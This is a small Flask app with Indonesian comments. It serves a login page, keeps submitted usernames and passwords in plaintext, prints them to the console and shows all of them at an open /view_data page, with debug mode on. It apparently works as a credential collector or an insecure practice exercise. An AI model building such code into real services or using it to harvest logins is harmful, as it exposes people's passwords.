from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

# Variabel untuk menyimpan data login sementara
login_data = []

@app.route('/')
def index():
    # Tampilkan halaman login
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    # Ambil data dari form login
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    # Simpan data login sementara
    login_data.append({'username': username, 'password': password})

    # Tampilkan data login di server console
    print(f"Received Username: {username}")
    print(f"Received Password: {password}")

    # Kirim respon balik ke client
    return jsonify(message="Login data received!")

@app.route('/view_data')
def view_data():
    # Menampilkan data username dan password yang telah dimasukkan
    return render_template('view_data.html', login_data=login_data)

if __name__ == '__main__':
    app.run(debug=True)
